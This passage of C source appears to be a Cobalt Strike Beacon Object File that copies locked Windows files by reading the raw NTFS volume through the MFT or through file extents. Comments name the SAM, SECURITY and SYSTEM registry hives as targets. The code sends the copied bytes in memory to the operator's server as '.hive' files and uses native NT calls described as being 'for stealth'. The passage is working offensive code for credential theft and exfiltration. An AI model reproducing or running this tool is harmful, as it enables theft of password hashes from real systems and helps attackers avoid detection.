        KERNEL32$MultiByteToWideChar(CP_ACP, 0, destFile, -1, destFileW, destLen);
    } else if (downloadToServer) {
        // Generate default filename from source if not provided
        char* fileName = MSVCRT$strrchr(sourceFile, '\\');
        if (!fileName) {
            fileName = MSVCRT$strrchr(sourceFile, '/');
        }
        if (fileName) {
            fileName++;  // Skip the separator
        } else {
            fileName = sourceFile;
        }
        int destLen = MSVCRT$strlen(fileName) + 1;
        destFileW = (WCHAR*)intAlloc(destLen * sizeof(WCHAR));
        KERNEL32$MultiByteToWideChar(CP_ACP, 0, fileName, -1, destFileW, destLen);
    }

    // Open volume using NtCreateFile for stealth (hardcoded to C: for now)
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING volumePath;
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    
    WCHAR volumeName[] = L"\\??\\C:";
    NTDLL$RtlInitUnicodeString(&volumePath, volumeName);
    
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = &volumePath;
    objAttr.Attributes = OBJ_CASE_INSENSITIVE;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;
    
    status = NTDLL$NtCreateFile(
        &hVolume,
        FILE_READ_DATA | SYNCHRONIZE,
        &objAttr,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open volume: 0x%08X\n", status);
        goto cleanup;
    }

    // Read NTFS boot sector
    if (!ReadNtfsBoot(hVolume, &boot)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read NTFS boot sector\n");
        goto cleanup;
    }

    if (MSVCRT$strcmp(mode, "MFT") == 0) {
        // MFT mode
        if (!GetNtfsFileInfo(sourceFileW, &mftRecordNumber, &fileSize)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get file info from source\n");
            goto cleanup;
        }

        mftRecord = (BYTE*)intAlloc(MFT_RECORD_SIZE);
        if (!mftRecord) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate MFT record buffer\n");
            goto cleanup;
        }

        if (!ReadMftRecord(hVolume, &boot, mftRecordNumber, mftRecord)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read MFT record\n");
            goto cleanup;
        }

        // Initialize fileSize before parsing (will be overwritten if $DATA found)
        fileInfo.fileSize = fileSize;
        
        if (!GetFileInfoFromRecord(mftRecord, &fileInfo, &boot)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse file info from MFT record\n");
            goto cleanup;
        }

        // Use actual file size from GetNtfsFileInfo (more reliable)
        fileInfo.fileSize = fileSize;
        
        if (downloadToServer) {
            // Copy file directly to memory for download (no disk write)
            ULONGLONG copiedSize = 0;
            if (!CopyFileByMftToMemory(hVolume, &fileInfo, &boot, &fileBuffer, &copiedSize)) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy file data to memory\n");
                goto cleanup;
            }
            
            // Close output file handle (we don't need it anymore)
            if (hOutput != INVALID_HANDLE_VALUE) {
                NTDLL$NtClose(hOutput);
                hOutput = INVALID_HANDLE_VALUE;
            }
            
            // Download to server with format: HOSTNAME_FILENAME.hive
            if (download_file(sourceFile, destFile, (char*)fileBuffer, (ULONG32)copiedSize)) {
                success = TRUE;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] File copied and downloaded to server: %llu bytes\n", copiedSize);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to download file to server\n");
            }
        } else {
            // Create output file using NtCreateFile for stealth
            if (!CreateOutputFileNt(destFileW, &hOutput)) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create output file\n");
                goto cleanup;
            }
            
            if (!CopyFileByMft(hVolume, hOutput, &fileInfo, &boot)) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy file data\n");
                goto cleanup;
            }

            success = TRUE;
            BeaconPrintf(CALLBACK_OUTPUT, "[+] File copied successfully: %llu bytes\n", fileSize);
        }
    } else if (MSVCRT$strcmp(mode, "Metadata") == 0) {
        // Metadata mode - use FSCTL_GET_RETRIEVAL_POINTERS
        HANDLE hSourceFile = INVALID_HANDLE_VALUE;
        EXTENT* extents = NULL;
        DWORD extentCount = 0;
        
        // Get file size
        if (!GetNtfsFileInfo(sourceFileW, &mftRecordNumber, &fileSize)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get file info from source\n");
            goto cleanup;
        }
        
        // Open source file for getting extents using CreateFileW (DeviceIoControl requires CreateFileW handle)
        WCHAR normalizedSourcePath[MAX_PATH * 2];
        
        if (!NormalizePathForCreateFileW(sourceFileW, normalizedSourcePath, MAX_PATH * 2)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to normalize source path\n");
            goto cleanup;
        }
        
        // Try with minimal access rights first (FSCTL_GET_RETRIEVAL_POINTERS may work with just FILE_READ_ATTRIBUTES)
        // For locked files like SAM, SECURITY, SYSTEM, we need FILE_FLAG_BACKUP_SEMANTICS
        hSourceFile = KERNEL32$CreateFileW(
            normalizedSourcePath,
            FILE_READ_ATTRIBUTES,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL,
            OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS,
            NULL
        );
        
        // If that fails, try with FILE_READ_DATA (but this usually fails for locked files)
        if (hSourceFile == INVALID_HANDLE_VALUE) {
            DWORD error1 = KERNEL32$GetLastError();
            hSourceFile = KERNEL32$CreateFileW(
                normalizedSourcePath,
                FILE_READ_ATTRIBUTES | FILE_READ_DATA,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                NULL,
                OPEN_EXISTING,
                FILE_FLAG_BACKUP_SEMANTICS,
                NULL
            );
            if (hSourceFile == INVALID_HANDLE_VALUE) {
                // Both attempts failed - file is likely locked
                DWORD error2 = KERNEL32$GetLastError();
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open source file (locked?): first=0x%08X, second=0x%08X\n", error1, error2);
                BeaconPrintf(CALLBACK_ERROR, "[-] Note: For locked files (SAM, SECURITY, SYSTEM), use MFT mode instead\n");
                goto cleanup;
            }
        }
        
        if (hSourceFile == INVALID_HANDLE_VALUE) {
            DWORD error = KERNEL32$GetLastError();
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open source file: 0x%08X\n", error);
            goto cleanup;
        }
        
        // Get extents
        if (GetFileExtents(hSourceFile, &extents, &extentCount) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get file extents\n");
            KERNEL32$CloseHandle(hSourceFile);
            goto cleanup;
        }
        
        KERNEL32$CloseHandle(hSourceFile);
        
        if (downloadToServer) {
            // Copy file directly to memory for download
            ULONGLONG copiedSize = 0;
            BYTE* tempBuffer = NULL;
            
            if (!CopyFileByExtentsToMemory(hVolume, extents, extentCount, boot.clusterSize, fileSize, &tempBuffer, &copiedSize)) {
                intFree(extents);
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy file data to memory\n");
                goto cleanup;
            }
            
            // Download to server
            if (download_file(sourceFile, destFile, (char*)tempBuffer, (ULONG32)copiedSize)) {
                success = TRUE;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] File copied and downloaded to server: %llu bytes\n", copiedSize);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to download file to server\n");
            }
            
            intFree(tempBuffer);
        } else {
            // Create output file using NtCreateFile for stealth
            if (!CreateOutputFileNt(destFileW, &hOutput)) {
                intFree(extents);
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create output file\n");
                goto cleanup;
            }
            
            if (!CopyFileByExtents(hVolume, hOutput, extents, extentCount, boot.clusterSize, fileSize)) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy file data\n");
                intFree(extents);
                goto cleanup;
            }
            
            success = TRUE;
            BeaconPrintf(CALLBACK_OUTPUT, "[+] File copied successfully: %llu bytes\n", fileSize);
        }
        
        if (extents) {
            intFree(extents);
        }
    }

cleanup:
    // Clean up handles using NtClose for stealth
    if (hVolume != INVALID_HANDLE_VALUE) {
        NTDLL$NtClose(hVolume);
    }
    if (hOutput != INVALID_HANDLE_VALUE) {
        NTDLL$NtClose(hOutput);
    }
    
    // Securely clear and free memory
    if (mftRecord) {
        MSVCRT$memset(mftRecord, 0, MFT_RECORD_SIZE);
        intFree(mftRecord);
    }
    if (fileInfo.runs) {
        MSVCRT$memset(fileInfo.runs, 0, sizeof(DATA_RUN) * fileInfo.runCount);
        intFree(fileInfo.runs);
    }
    if (fileInfo.residentData) {
        MSVCRT$memset(fileInfo.residentData, 0, fileInfo.residentDataSize);
        intFree(fileInfo.residentData);
    }
    if (sourceFileW) {
        MSVCRT$memset(sourceFileW, 0, sourceLen * sizeof(WCHAR));
        intFree(sourceFileW);
    }
    if (destFileW) {
        int destLen = KERNEL32$lstrlenW(destFileW) + 1;
        MSVCRT$memset(destFileW, 0, destLen * sizeof(WCHAR));
        intFree(destFileW);
    }
    
    if (fileBuffer) {
        MSVCRT$memset(fileBuffer, 0, (SIZE_T)fileSize);
        intFree(fileBuffer);
    }
    
    // Clear sensitive data from stack
    MSVCRT$memset(&boot, 0, sizeof(boot));
    MSVCRT$memset(&fileInfo, 0, sizeof(fileInfo));
}

